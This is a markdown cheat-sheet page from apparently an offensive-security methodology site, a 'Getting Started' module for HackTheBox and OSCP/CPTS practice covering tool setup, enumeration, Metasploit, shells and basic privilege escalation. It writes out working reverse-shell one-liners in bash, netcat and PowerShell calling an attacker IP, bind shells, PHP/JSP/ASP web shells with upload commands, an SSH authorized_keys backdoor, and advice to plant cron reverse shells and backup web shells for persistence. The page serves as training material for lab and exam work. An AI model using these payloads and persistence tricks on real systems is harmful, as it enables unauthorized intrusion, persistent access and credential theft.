---
title: "Getting Started"
description: "Base setup, tools, and initial workflow for offensive audits."
sidebar:
  order: 2
  label: "Getting Started"
---
> Getting started module: environment setup, essential tools, initial reconnaissance, shell types, and basic privilege escalation. The operational foundation upon which all other modules are built.

---


## Base Tools — Setup and Usage

### SSH

```bash
ssh user@10.10.10.10
ssh root@10.10.10.10 -i id_rsa   # stolen private key (chmod 600 id_rsa first)
```

### Netcat / Socat

```bash
nc -nv 10.10.10.10 22            # manual banner grabbing
nc -lvnp 1234                    # reverse shell listener
```

| Flag | Usage |
|------|-----|
| `-l` | Listen mode |
| `-v` | Verbose mode |
| `-n` | No DNS resolution |
| `-p` | Port |

### tmux — Essential Shortcuts

```
tmux                  # start session
CTRL+B → C            # new window
CTRL+B → 0/1/2        # switch window
CTRL+B → SHIFT+%      # vertical split
CTRL+B → SHIFT+"      # horizontal split
CTRL+B → arrows       # navigate between panes
```

### Vim — Quick Shortcuts

```
i           # insert mode
ESC         # return to normal mode
:w          # save
:q!         # exit without saving
:wq         # save and exit
dd / yy / p # cut line / copy line / paste
```

---

## VPN — Connecting to HTB

```bash
sudo openvpn user.ovpn
ip a                             # verify tun0 with IP 10.10.x.x
netstat -rn                      # view routes (10.129.0.0/16 via tun0)
ifconfig tun0                    # verify VPN interface
```

> ⚠️ Always from a clean VM. Do not use the same VM as for real clients.

---

## Service Reconnaissance (Nmap)

### Basic Scans

```bash
nmap 10.129.42.253                                  # top 1000 TCP
nmap -sV --open -oA scan_inicial 10.129.42.190      # versions + save outputs
nmap -sV -sC -p- 10.129.42.253                      # full TCP + default scripts
nmap -sC -p 22,80 -oA nibbles_script 10.129.42.190  # scripts on specific ports
nmap -A -p445 10.129.42.253                         # OS + version + traceroute
nmap -sV --script=banner -p21 10.10.10.0/24         # banner grabbing in a range
nmap --script smb-os-discovery.nse -p445 10.10.10.40
nmap -sV --script=http-enum -oA http_enum 10.129.42.190
```

| Flag | Meaning |
|------|-------------|
| `-sV` | Service versions |
| `-sC` | Default scripts |
| `-p-` | All ports (65535) |
| `--open` | Open ports only |
| `-oA` | Save in all three formats (.nmap/.xml/.gnmap) |
| `-A` | All: OS detection, version, scripts, traceroute |

### Custom NSE Scripts

```bash
locate scripts/citrix          # search for available scripts
nmap --script <script_name.nse> -p<port> <host>
```

---

## Web Enumeration

### Banner / Headers

```bash
curl -IL https://www.target.com       # server headers
nc -nv 10.129.42.190 80               # manual HTTP banner grabbing
whatweb 10.10.10.121                  # fingerprint technologies
whatweb --no-errors 10.10.10.0/24     # range sweep
```

### Directory Brute-Force (Gobuster)

```bash
gobuster dir -u http://10.10.10.121/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt
```

| HTTP Code | Meaning |
|-------------|-------------|
| 200 | OK — resource accessible |
| 301 | Redirect (follow) |
| 403 | Forbidden (interesting) |
| 404 | Not found |

### Quick Web Checklist

- [ ] `robots.txt` — hidden/admin paths
- [ ] Source code (CTRL+U) — comments containing credentials
- [ ] SSL Certificate — emails, company names
- [ ] HTTP Headers — versions, frameworks
- [ ] Subdomains — gobuster dns

### Anonymous FTP

```bash
nmap -sC -sV -p21 <IP>          # verify ftp-anon
ftp -p <IP>
> Name: anonymous
> ls / cd pub / get file.txt
```

### SMB

```bash
smbclient -N -L \\\\<IP>                  # list shares without auth
smbclient -U user \\\\<IP>\\share     # connect with credentials
> ls / cd folder / get file.txt
nmap --script smb-os-discovery.nse -p445 <IP>
```

### SNMP

```bash
snmpwalk -v 2c -c public <IP> 1.3.6.1.2.1.1.5.0   # hostname
onesixtyone -c dict.txt <IP>                        # brute-force community strings
```

---

## Searching for Exploits

```bash
sudo apt install exploitdb -y
searchsploit openssh 7.2
searchsploit -x linux/remote/45233.py   # view exploit without opening
```

**Online databases:** ExploitDB · Rapid7 DB · Vulnerability Lab

### Metasploit — Basic Flow

```bash
msfconsole
msf6 > search exploit eternalblue
msf6 > search cve:2009 type:exploit       # advanced filters
msf6 > use exploit/windows/smb/ms17_010_psexec
msf6 > show options
msf6 > set RHOSTS 10.10.10.40
msf6 > set LHOST tun0
msf6 > check                              # verify vulnerability before exploiting
msf6 > exploit                            # or: run
meterpreter > getuid
meterpreter > shell
```

---

## Shell Types

### Reverse Shell (Most Common)

```bash
# Listener on attacker
nc -lvnp 1234

# Payload on victim — Linux
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f

# Payload on victim — Windows (PowerShell)
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

### Bind Shell

```bash
# On victim (listening)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f

# On attacker (connecting)
nc 10.10.10.1 1234
```

### Web Shell

```php
<?php system($_REQUEST["cmd"]); ?>
```
```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```
```asp
<% eval request("cmd") %>
```

**Default Webroots:**

| Server | Path |
|----------|------|
| Apache | `/var/www/html/` |
| Nginx | `/usr/local/nginx/html/` |
| IIS | `c:\inetpub\wwwroot\` |
| XAMPP | `C:\xampp\htdocs\` |

```bash
# Upload web shell via RCE
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php

# Use web shell
curl http://SERVER_IP/shell.php?cmd=id
```

### TTY Upgrade (Non-Interactive Shell → Full TTY)

```bash
# In the netcat shell:
python -c 'import pty; pty.spawn("/bin/bash")'
# CTRL+Z to background the shell

# In the local terminal:
stty raw -echo
fg
# Enter x2

# Adjust size (in local terminal first):
echo $TERM          # xterm-256color
stty size           # rows columns

# In the remote shell:
export TERM=xterm-256color
stty rows 67 columns 318
```

---

## Privilege Escalation (Basic)

### Automated Enumeration

```bash
./linpeas.sh                    # Linux — color-coded, automated
./winPEAS.exe                   # Windows
./seatbelt.exe -group=all       # Windows — Seatbelt
```

### Sudo

```bash
sudo -l                         # see what the current user can run
sudo su -                       # if they have ALL → root
sudo -u otheruser /bin/echo test # run as another user
```

> GTFOBins: look up the binary with `sudo` to see how to escalate → `sudo find . -exec /bin/sh \; -quit`

### SUID / SGID

```bash
find / -perm -4000 -type f 2>/dev/null     # search for SUID
find / -perm -2000 -type f 2>/dev/null     # search for SGID
```

### Cron Jobs

```bash
cat /etc/crontab
ls /etc/cron.d/
ls /var/spool/cron/crontabs/
# If there is write permission over a script run by cron → insert reverse shell
```

### Exposed Credentials

```bash
cat /var/www/html/config.php     # DB passwords
cat ~/.bash_history              # previous commands
# Search for files with passwords:
grep -r "password" /var/www/ 2>/dev/null
```

### SSH Keys

```bash
cat /home/user/.ssh/id_rsa    # copy → chmod 600 id_rsa → ssh -i id_rsa
# Backdoor: add your public key to the compromised host
echo "ssh-rsa AAAA...your_key" >> /root/.ssh/authorized_keys
ssh-keygen -f key                # generate pair to implant
```

### Vulnerable Software

```bash
dpkg -l                          # installed software on Linux
ls "C:\Program Files\"           # Windows
searchsploit <name> <version>  # search for exploit
```

---

## File Transfer (Basic)

```bash
# HTTP Server on attacker
python3 -m http.server 8000

# Download on victim
wget http://10.10.14.1:8000/linpeas.sh
curl http://10.10.14.1:8000/linpeas.sh -o linpeas.sh

# SCP (if SSH credentials are available)
scp linpeas.sh user@10.10.10.10:/tmp/linpeas.sh

# Base64 (if there is no network outbound access)
base64 shell -w 0                          # on attacker → copy string
echo "<base64>" | base64 -d > shell       # on victim

# Verify integrity
md5sum shell                               # compare on both sides
file shell                                 # verify file type
```

---

## Folder Structure for Engagements

```
Projects/
└── Client/
    └── EPT/
        ├── evidence/
        │   ├── credentials/
        │   ├── data/
        │   └── screenshots/
        ├── logs/
        ├── scans/
        ├── scope/
        └── tools/
```

> **Exam Tip:** save all nmap outputs with `-oA`. A timeline with timestamps is mandatory in the report.

---

## Pitfalls / Gotchas

- **Do not forget `chmod 600 id_rsa`** before using a stolen SSH key — the server rejects keys with loose permissions.
- **TTY without upgrade** → no tab-completion, no history, no `su`, no `vi`. Always perform the upgrade.
- **`sudo -l` before linpeas** — it is silent and often gives direct access.
- **Anonymous FTP** and **SNMP community `public`** are the first checks when seeing those ports.
- **Web shell persists** after reboot; reverse/bind shell does not. If the connection is unstable, plant a web shell as a backup.
- **Metasploit does not work for everything on the OSCP/CPTS exams** — practice manual techniques for every vector.
- **Password reuse** is very common: test credentials from DBs, FTP, or config files with `su` and `ssh`.
- The HTB VPN runs on `tun0`, not `eth0` — ensure you use the correct IP in your reverse shell payloads.

---

## Related Cheatsheets

- [Penetration Testing Process](/en/metodologias/fundamentos/penetration-testing-process/) — Methodology and engagement phases
- [Network Enumeration with Nmap](/en/metodologias/recon/network-enumeration-nmap/) — Nmap in-depth: NSE, timing, evasion
- [Shells & Payloads](/en/metodologias/exploitation/shells-payloads/) — Generating payloads with msfvenom, advanced shells
- [File Transfers](/en/metodologias/privesc/file-transfers/) — Complete file transfers for Windows and Linux
- [Linux Privilege Escalation](/en/metodologias/privesc/linux-privilege-escalation/) — Detailed Linux PrivEsc
- [Windows Privilege Escalation](/en/metodologias/privesc/windows-privilege-escalation/) — Detailed Windows PrivEsc
- [Using the Metasploit Framework](/en/metodologias/exploitation/metasploit-framework/) — Complete MSF guide
